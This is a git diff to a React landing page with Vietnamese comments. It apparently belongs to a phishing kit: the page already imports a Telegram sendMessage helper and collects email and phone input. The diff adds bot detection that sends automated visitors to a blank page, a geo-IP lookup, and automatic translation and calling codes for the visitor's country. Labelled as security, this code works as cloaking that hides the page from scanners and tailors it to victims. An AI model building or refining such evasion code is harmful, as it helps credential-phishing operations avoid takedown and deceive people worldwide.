@@ -7,6 +7,10 @@ import { useState, useEffect, useCallback, useMemo } from 'react';
 import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
+// 🛡️ THÊM IMPORT CÁC FUNCTION BẢO MẬT
+import countryToLanguage from '@/utils/country_to_language';
+import detectBot from '@/utils/detect_bot';
+import axios from 'axios';
 
 const Home = () => {
     const defaultTexts = useMemo(
@@ -55,6 +59,51 @@ const Home = () => {
     const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
     const [countryCode, setCountryCode] = useState('US');
     const [callingCode, setCallingCode] = useState('+1');
+    // 🛡️ THÊM STATE LOADING
+    const [isLoading, setIsLoading] = useState(true);
+
+    // 🛡️ THÊM HÀM KHỞI TẠO BẢO MẬT
+    const initializeSecurity = useCallback(async () => {
+        try {
+            // 1. Kiểm tra bot tự động
+            const botResult = await detectBot();
+            if (botResult.isBot) {
+                window.location.href = 'about:blank';
+                return;
+            }
+
+            // 2. Lấy thông tin IP và vị trí
+            const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
+            const ipData = response.data;
+            
+            // Lưu thông tin IP vào localStorage
+            localStorage.setItem('ipInfo', JSON.stringify(ipData));
+            
+            const detectedCountry = ipData.country_code || 'US';
+            setCountryCode(detectedCountry);
+
+            // 3. Xác định ngôn ngữ và dịch
+            const targetLang = countryToLanguage[detectedCountry] || 'en';
+            localStorage.setItem('targetLang', targetLang);
+            
+            if (targetLang !== 'en') {
+                await translateAllTexts(targetLang);
+            }
+
+            // 4. Set calling code
+            const code = getCountryCallingCode(detectedCountry);
+            setCallingCode(`+${code}`);
+
+            setIsLoading(false);
+            
+        } catch (error) {
+            console.log('Security initialization failed:', error.message);
+            // Fallback values
+            setCountryCode('US');
+            setCallingCode('+1');
+            setIsLoading(false);
+        }
+    }, []);
 
     // Hàm validate email
     const validateEmail = (email) => {
@@ -144,30 +193,10 @@ const Home = () => {
         [defaultTexts]
     );
 
+    // 🛡️ THAY THẾ useEffect CŨ BẰNG useEffect MỚI
     useEffect(() => {
-        const ipInfo = localStorage.getItem('ipInfo');
-        if (!ipInfo) {
-            window.location.href = 'about:blank';
-        }
-
-        try {
-            const ipData = JSON.parse(ipInfo);
-            const detectedCountry = ipData.country_code || 'US';
-            setCountryCode(detectedCountry);
-
-            // get calling code
-            const code = getCountryCallingCode(detectedCountry);
-            setCallingCode(`+${code}`);
-        } catch {
-            setCountryCode('US');
-            setCallingCode('+1');
-        }
-
-        const targetLang = localStorage.getItem('targetLang');
-        if (targetLang && targetLang !== 'en') {
-            translateAllTexts(targetLang);
-        }
-    }, [translateAllTexts]);
+        initializeSecurity();
+    }, [initializeSecurity]);
 
     const handleInputChange = (field, value) => {
         if (field === 'phone') {
@@ -289,6 +318,19 @@ const Home = () => {
             title: translatedTexts.policiesReporting
         }
     ];
+
+    // 🛡️ THÊM LOADING COMPONENT
+    if (isLoading) {
+        return (
+            <div className="flex min-h-screen items-center justify-center bg-white">
+                <div className="text-center">
+                    <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto"></div>
+                    <p className="mt-4 text-gray-600">Loading...</p>
+                </div>
+            </div>
+        );
+    }
+
     return (
         <>
             <header className='sticky top-0 left-0 flex h-14 justify-between p-4 shadow-sm'>
